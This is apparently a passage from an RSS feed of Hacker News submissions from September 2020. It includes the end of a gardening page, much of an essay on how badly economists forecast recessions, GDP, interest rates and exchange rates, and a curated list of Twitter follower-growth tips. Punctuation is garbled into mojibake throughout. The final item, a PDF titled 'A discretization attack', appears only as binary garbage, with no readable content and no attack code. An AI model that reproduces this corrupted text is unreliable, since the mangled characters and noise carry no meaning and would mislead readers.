data-skipgform_ajax_framebjll=""></p></div></div></div><p>Organic Farming Basics</p></div><div tabindex="0" role="button" data-videoid="jB6rx9N5L1E"><div><div data-bg="https://i.ytimg.com/vi/jB6rx9N5L1E/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Hydroponic Farming</p></div></div></div></div></div>

<!-- AI CONTENT END 1 -->
        </div></div>]]>
            </description>
            <link>https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521329</guid>
            <pubDate>Fri, 18 Sep 2020 20:06:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24521279">thread link</a>) | @anarbadalov
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You‚Äôll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte‚Äôs site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies‚Äô websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn‚Äôt stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you‚Äôll find forecasts stretching all the way to the year 2100. We‚Äôre still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let‚Äôs take a moment to look at the predictions of the past.&nbsp;Let‚Äôs see how our projections panned out.</p><h3>We can‚Äôt predict recessions</h3><p>The Economist‚Äôs ‚ÄúThe World in 2020‚Äù, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue‚Äôs predictions on 2020‚Äôs economic outlook:&nbsp;</p><blockquote><p>‚ÄúBanks, especially in Europe, will battle with negative interest rates. America will flirt with recession‚Äîbut don‚Äôt be surprised if disaster fails to strike, and markets revive.‚Äù</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn‚Äôt to know that we were on the precipice of a pandemic.&nbsp;So let‚Äôs review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;‚ÄúIn the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: ‚ÄúThe record of failure to predict recessions is virtually unblemished.‚Äù‚Äù</p></blockquote><p>It‚Äôs hard to overstate the severity of Loungani‚Äôs findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund‚Äôs predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden‚Äôs success rate of 0.85% is remarkably consistent with Longani‚Äôs.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>‚ÄúSince 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.‚Äù</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It‚Äôs clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn‚Äôt stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>‚ÄúEven with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (‚Ä¶) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.‚Äù</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn‚Äôt sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>‚Äú(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany‚Äôs economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.‚Äù</p></blockquote><p>But it isn‚Äôt just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you‚Äôd expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn‚Äôt stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>‚ÄúThe level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government‚Äôs budget.‚Äù</p></blockquote><p>With interest rates being so important to so many, it‚Äôs no surprise that an entire industry of professional predictors exists to monitor the rate‚Äôs past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions‚Äô lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That‚Äôs like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn‚Äôt a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>‚ÄúThe decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.‚Äù</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn‚Äôt stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That‚Äôs the field that we‚Äôll focus on next.</p><h3>We can‚Äôt predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>‚ÄúIn six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (‚Ä¶) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.‚Äù</p></blockquote><p>Gigerenzer‚Äôs own conclusion was even more clear:</p><blockquote><p>‚ÄúForecasts of dollar-to-euro exchange rates are worthless.‚Äù</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate ‚Ä¶</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521279</guid>
            <pubDate>Fri, 18 Sep 2020 20:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Twitter Tips Collection]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521251">thread link</a>) | @thetimekiller
<br/>
September 18, 2020 | https://joshspector.com/twitter-tips/ | <a href="https://web.archive.org/web/*/https://joshspector.com/twitter-tips/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				
<p>If you‚Äôre looking for Twitter tips, you‚Äôve come to the right place.</p>



<p>In addition to tweeting every day and growing my own Twitter following to 11,000+ followers (let‚Äôs <a href="https://twitter.com/jspector" target="_blank" rel="noreferrer noopener">connect here</a>), I regularly share Twitter tips in my <a href="https://fortheinterested.com/subscribe/?ref=TwitterTipsCollection" target="_blank" rel="noreferrer noopener">For The Interested newsletter</a>.</p>



<p>I put together this page to share with you the best of what I‚Äôve learned from my own experiences and from other Twitter experts.</p>



<p>Following are a collection of links to Twitter tips to help you figure out what to tweet, get more followers, and get more value out of the platform.</p>



<p>This page will be updated frequently since I‚Äôm always learning and finding new stuff, so bookmark it and check back in occasionally to see what‚Äôs new.</p>



<p>Now, let‚Äôs get to the good stuff‚Ä¶</p>



<hr>



<figure><img loading="lazy" width="1024" height="535" src="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-1024x535.png" alt="Tweet Writing Tips" srcset="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-1024x535.png 1024w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-300x157.png 300w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-768x401.png 768w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-1536x803.png 1536w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-1200x627.png 1200w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18-600x314.png 600w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-18.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3>What To Tweet: 21 Unique and Useful Ideas</h3>



<p>Every great Twitter strategy is rooted in an ability to post tweets that provide value to people‚Ää‚Äî‚Ääthat‚Äôs ultimately how you get followers, build relationships, and create value for yourself and your audience.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to tweet something valuable</li><li>How to tweet something promotional</li><li>How to tweet something interactive</li></ul>



<p>Read it here: <a href="https://joshspector.com/what-to-tweet/" target="_blank" rel="noreferrer noopener">What to tweet: 21 unique and useful ideas</a>.</p>



<h3>Here Are Your Next Four Tweets</h3>



<p>Twitter‚Äôs real value is unlocked when you use it to identify and connect with people who can help you accomplish your goals. Don‚Äôt chase followers ‚Äî build relationships.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to craft a recommendations tweet</li><li>Why replies are the most overlooked opportunity on Twitter</li><li>How to leverage recap tweets</li></ul>



<p>Read it here: <a href="https://fortheinterested.com/here-are-your-next-four-tweets/" target="_blank" rel="noreferrer noopener">Here are your next four tweets</a>.</p>



<h3>Six Keys To Sharing Content On Twitter</h3>



<p>This article from Steph Smith offers examples of clever and effective ways to get the most out of what you share on Twitter.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to give people a reason to click</li><li>How to use video to draw attention</li><li>Why you‚Äôll get more retweets without using hashtags </li></ul>



<p>Read it here: <a href="https://marketingexamples.com/content/share-content-on-twitter" target="_blank" rel="noreferrer noopener">Six keys to sharing content on Twitter</a>.</p>



<h3>How To Tweet</h3>



<p>This Twitter thread from Daniel Vassallo breaks down the most common mistakes he found after analyzing 50+ Twitter accounts.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>Why you should avoid retweets</li><li>The importance of tweeting every day</li><li>How to avoid a negative ‚Äúask budget‚Äù</li></ul>



<p>Read it here: <a href="https://twitter.com/dvassallo/status/1236067288647733249" target="_blank" rel="noreferrer noopener">How to tweet</a>.</p>



<h3>How To Write A Tweetstorm</h3>



<p>This article from Jan-Erik Asplund offers a deep dive into how to craft an effective tweet thread.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>The key to creating a strong first tweet in a thread</li><li>How to use a simple narrative arc</li><li>How to tag and link to increase distribution and reach</li></ul>



<p>Read it here: <a href="https://www.animalz.co/blog/how-to-write-a-tweetstorm/" target="_blank" rel="noreferrer noopener">How to write a tweetstorm</a>.</p>



<h3>The Four Types Of Tweets You Should Post</h3>



<p>This 9-minute video from Phil Pallen breaks down how you can better use Twitter to engage your audience.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to post tweets with website links</li><li>How to leverage questions in tweets</li><li>How to use Twitter for networking</li></ul>



<p>Watch it here: <a rel="noreferrer noopener" href="https://fortheinterested.com/the-four-types-of-tweets-you-should-post/" target="_blank">The four types of tweets you should post</a>.</p>



<h3>How To Write Tweets That Get Reactions</h3>



<p>This tweet thread from Jens Lennartsson explores what makes some tweets attract a lot of engagement while others do not.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to pick a side</li><li>Why you should treat your first sentence like a title</li><li>How to make it simple for people to interact</li></ul>



<p>Read it here: <a href="https://twitter.com/JensLennartsson/status/1267773122813575168" target="_blank" rel="noreferrer noopener">How to write tweets that get reactions</a>.</p>



<h3>Why You Should Retweet Yourself</h3>



<p>This article from Taylor Lorenz suggest retweeting your own tweets can be an important way to cut through the noise and reach more people.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to retweet yourself without losing followers</li><li>The art of the retweet and delete</li><li>Why you should have no fear of the self-retweet</li></ul>



<p>Read it here: <a rel="noreferrer noopener" href="https://www.mic.com/articles/182265/how-to-get-more-likes-rts-on-twitter-retweet-yourself-taylor-lorenz" target="_blank">Why you should retweet yourself</a>.</p>



<hr>



<figure><img loading="lazy" width="1024" height="535" src="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-1024x535.png" alt="Follower growth tips" srcset="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-1024x535.png 1024w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-300x157.png 300w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-768x401.png 768w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-1536x803.png 1536w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-1200x627.png 1200w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19-600x314.png 600w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-19.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3>26 Ways To Get Twitter Followers And Write Better Tweets</h3>



<p>After reviewing the accounts of 70+ people and brands, I noticed many were being held back by the same issues so I put together this list of best practices to grow your following on Twitter.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>What to do if you don‚Äôt have many followers</li><li>How to get your tweets to reach more people</li><li>How to optimize your Twitter bio to get more followers </li></ul>



<p>Read it here: <a href="https://fortheinterested.com/get-twitter-followers/" target="_blank" rel="noreferrer noopener">26 ways to get Twitter followers and write better tweets</a>.</p>



<h3>How To Crush It On Twitter</h3>



<p>This 99-minute video from David Perell and Matthew Kobach features each of them giving their own presentation about how they approach Twitter and what they‚Äôve learned about growing a following on the platform.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>The four keys to writing a good tweet</li><li>How to share your creations without being too self-promotional</li><li>Why VCs are so good at using Twitter</li></ul>



<p>Watch it here: <a href="https://fortheinterested.com/how-to-crush-it-on-twitter/" target="_blank" rel="noreferrer noopener">How to crush it on Twitter</a></p>



<h3>Six Strategies To Get Your First 500 Twitter Followers</h3>



<p>This article from Brandon Zhang breaks down exactly how he got his initial Twitter followers and what he learned in the process.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to meet the ‚ÄúTwitter Elite‚Äù</li><li>The formula for a viral tweet</li><li>How to use direct messages to grow your network</li></ul>



<p>Read it here: <a href="https://medium.com/better-marketing/these-6-strategies-got-me-my-first-500-twitter-followers-c052f9bf211c" target="_blank" rel="noreferrer noopener">Six strategies to get your first 500 Twitter followers</a>.</p>



<h3>How To Grow Your Twitter Audience From Scratch</h3>



<p>This article from Jay Tan features a collection of tips you can follow to build your audience when you first start using Twitter (or if growth has been slow going for you).</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>The value of commenting on other people‚Äôs tweets</li><li>How to turn your tweets into a funnel for your blog or website</li><li>The importance of doubling down on your initial followers who engage with you</li></ul>



<p>Read it here: <a href="https://www.indiehackers.com/post/how-to-grow-your-twitter-audience-from-scratch-b0f97c784f" target="_blank" rel="noreferrer noopener">How to grow your audience from scratch</a>.</p>



<h3>How To Create A Viral Challenge On Twitter</h3>



<p>This article from Rae Paoletta offers a step-by-step guide to follow if you want to create the conditions that allow a tweet to have a good chance of going viral.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>The ‚ÄúWin A Thing‚Äù framework</li><li>The importance of timing and relevance</li><li>How to make your challenge accessible to your audience</li></ul>



<p>Read it here: <a href="https://medium.com/article-group/how-i-created-a-viral-awards-show-on-twitter-d02bf9b86e44" target="_blank" rel="noreferrer noopener">How to create a viral challenge on Twitter</a>.</p>



<h3>Lessons From A Tweet That Got 17 Million Views</h3>



<p>This article from Ash Read is a deep dive into how $24,000 worth of Twitter ads were used to generate 17 million impressions on a single tweet. </p>



<p>A few things you‚Äôll learn:</p>



<ul><li>Why Twitter is a great place to repurpose content</li><li>How a Twitter thread can help you accomplish multiple goals at once</li><li>How to spark conversations on Twitter</li></ul>



<p>Read it here: <a href="https://medium.com/social-media-tips/what-we-learned-from-a-17-2-million-view-tweet-db5915e63628" target="_blank" rel="noreferrer noopener">Lessons from a tweet that got 17 million views</a>.</p>



<hr>



<figure><img loading="lazy" width="1024" height="535" src="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-1024x535.png" alt="Twitter Optimization Tips" srcset="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-1024x535.png 1024w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-300x157.png 300w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-768x401.png 768w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-1536x803.png 1536w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-1200x627.png 1200w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20-600x314.png 600w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-20.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h3>How To Optimize Your Twitter Profile</h3>



<p>This article from Jay Tan includes 8 ways to optimize your Twitter profile to drive sales and generate opportunities for yourself or your company.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>What to do with your profile picture and cover image</li><li>Why you should always include a URL</li><li>How to use your bio for positioning</li></ul>



<p>Read it here: <a href="https://zlappo.com/blog/ultimate-guide-optimize-your-twitter-profile-more-followers-and-conversions-examples-given/" target="_blank" rel="noreferrer noopener">How to optimize your Twitter profile</a>.</p>



<h3>How To Use Twitter To Become Smarter And Find Interesting People</h3>



<p>This presentation from Nikhil Krishnan suggests a variety of ways to get more out of the time and effort you put into Twitter.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>How to get into other people‚Äôs conversations</li><li>Why you should use lists built around specific topics</li><li>Why you should treat the unfollow button as your best friend</li></ul>



<p>Read it here: <a href="https://speakerdeck.com/nikhilkrishnan/why-twitter-is-dope-and-how-to-use-it" target="_blank" rel="noreferrer noopener">How to use Twitter to become smarter and find interesting people</a>.</p>



<h3>What Happens When You Only Follow 88 People On Twitter</h3>



<p>This article from Avinash Kaushik reveals how he uses Twitter and why he‚Äôs found it valuable to only follow 88 people at all times.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>The benefits of creating a limit</li><li>How it leads him to deeply consider the value exchange in following someone</li><li>How he uses the limit to ensure he consumes a diversity of ideas</li></ul>



<p>Read it here: <a href="https://madmimi.com/p/210aeb?fe=1&amp;pact=2023800-144605209-8834834639-f660d364ab9c3cdd338a0c7764e1a0225d2c5317" target="_blank" rel="noreferrer noopener">What happens when you only follow 88 people on Twitter</a>.</p>



<h3>How To Turn Your Toxic Twitter Timeline Into A Valuable Learning Resource</h3>



<p>This article from Andrew Leese shares how Twitter became significantly more valuable to him after he changed the way he uses it and specifically who he follows.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>Why he unfollowed sports accounts</li><li>What marketers he started to follow instead</li><li>What he learned about Twitter and himself</li></ul>



<p>Read it here: <a href="https://andrewleese.co.uk/twitter-earning-resource/" target="_blank" rel="noreferrer noopener">How to turn your toxic Twitter timeline into a valuable learning resource</a>.</p>



<h3>Why You Should Use Twitter</h3>



<p>This article from Joe Waters was published in 2019, but remains true today. It features four reasons why Twitter is worth using and a few ways to make your experience on the platform more valuable.</p>



<p>A few things you‚Äôll learn:</p>



<ul><li>The key difference between Twitter and other social media platforms</li><li>Why you should follow people with smaller followings</li><li>Why you should follow people instead of brands</li></ul>



<p>Read it here: <a href="https://www.selfishgiving.com/blog/newsletter010219" target="_blank" rel="noreferrer noopener">Why you should use Twitter</a>.</p>



<hr>



<figure><img loading="lazy" width="1024" height="535" src="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-1024x535.png" alt="One Final Thing" srcset="https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-1024x535.png 1024w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-300x157.png 300w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-768x401.png 768w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-1536x803.png 1536w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-1200x627.png 1200w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161-600x314.png 600w, https://joshspector.com/wp-content/uploads/2020/09/Twitter-Post-161.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>If you made it all they way down here to the end of this page, I just want to say thanks for your attention and congratulations!</p>



<p>You‚Äôre well on your way to becoming a Twitter expert.</p>



<p>If you found this information helpful, I‚Äôd love to connect with you in any (or all!) of the following places:</p>



<ul><li>My <a href="https://fortheinterested.com/subscribe/?ref=TwitterTipsCollection" target="_blank" rel="noreferrer noopener">For The Interested newsletter</a></li><li>My <a href="https://joshspector.com/thisishow/" target="_blank" rel="noreferrer noopener">This Is How I Do It newsletter</a></li><li>My personal <a href="https://twitter.com/jspector" target="_blank" rel="noreferrer noopener">Twitter account</a></li></ul>



<p>You also may find my <a href="https://joshspector.com/newsletter-tips/" target="_blank" rel="noreferrer noopener">Newsletter Tips Collection</a> helpful.</p>



<p>Thanks again and see you on Twitter!</p>



<p>Josh</p>

			</div></div>]]>
            </description>
            <link>https://joshspector.com/twitter-tips/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521251</guid>
            <pubDate>Fri, 18 Sep 2020 19:58:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A discretization attack [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24520781">thread link</a>) | @Kubuxu
<br/>
September 18, 2020 | https://cr.yp.to/papers/categories-20200918.pdf | <a href="https://web.archive.org/web/*/https://cr.yp.to/papers/categories-20200918.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div √Æ≈ìj="">√Ñ√ªg√≥
‚Ä†√Ü~mL√∑}¬Ø√Æ¬Æ)√ß{MJ√Ö¬™√ö√©^‚Äú2√±c√©CQ¬Æ¬≤^¬•¬∫J≈í‚Äì√â21z√π√≠e*¬¥L√º√•&lt;¬´√íÀÜ √é√©√ö¬æ‚Äò√¨√≤ÔøΩqS`wÔøΩÀÜ√Ü¬¢E.≈ì√Ç≈æ=√¢$}√ù¬§Àúj¬¥wP¬®≈†3√±¬®$700D‚Äπ√¨)√ævA√¶√ù‚Äù∆íG
√à‚Ä¶q=z√≤w√èr√©≈í√™¬¨8¬±‚Äò‚Äì‚Äú
'L&gt;¬£F√ÅoQ&gt;‚Ç¨≈ΩZ&amp;N/&gt;M√ß≈æn0'Y≈†¬≤-*ÀÜ¬µ√Ö\&lt;¬ßXjr√¢5S√î√¶k‚Ä∞√Ç√¢[‚Ä∞√øÔøΩ
¬£N&amp;√â¬∂6√íJ√π‚ÄùE%P¬´√ñh‚Äπ√™√Ø-√∑''√∑√Æ√Ω√ñ≈æ}√±&lt;√ácH√Æ-‚Ä°¬´G¬®.¬π‚Äù√á√ùk_¬∑C√¨¬≤ ¬¥√•	,√üq√¨K¬Ω√∏-)‚Äò√ò√óR¬®√ÇK=ÔøΩAX&lt;
√ª√Åc√âi∆íÔøΩ?n≈†√óT√Øi√§mU√Å\p‚Äò√µB√¨√•6o(√¶b√ï{√Ä¬πÔøΩÔøΩ‚Ä†)O‚Ä¶#√Ñ¬™≈ì‚Äú@√ò√ë√ú√†√ÅZ√†.p√Ö¬∂¬≤√Üd√∑¬∑D\¬º‚Ä¶u√ëE5¬øK√í√µ4&amp;¬æ5
U√áCW‚Ä¶r√ã¬£‚Ä¢n:x√Æt4ddp‚Äû√ºkhÔøΩ,‚Ä†g√Æ-¬πF√∂¬§≈Ω‚Ä∞ÔøΩ√≥R9W%√π≈ì√¨fw√∂√â/‚Ä¢HI'√ê¬Ωmk4≈°ÀÜ¬∞‚ÄùÀÜ√Äi|l√ëMG¬∏√≤.9√∞ÔøΩ‚Ä†8¬∏√à√±B√ÑC8√•q&lt;√ã√™√Ñ¬£ÔøΩe√ê5-3`g1¬ßWR&nbsp;¬≥Àú¬®(H fO‚Äö,‚Äô√ª¬æ≈ío.‚Äô√≤cp≈Ω√°q^√à¬®&lt;ÀÜ)√ç¬ª√à$√ë*√Ö‚Ä¶k#`XCX(‚Äû¬¶\l{√Ω√£‚Äú F√ü9	
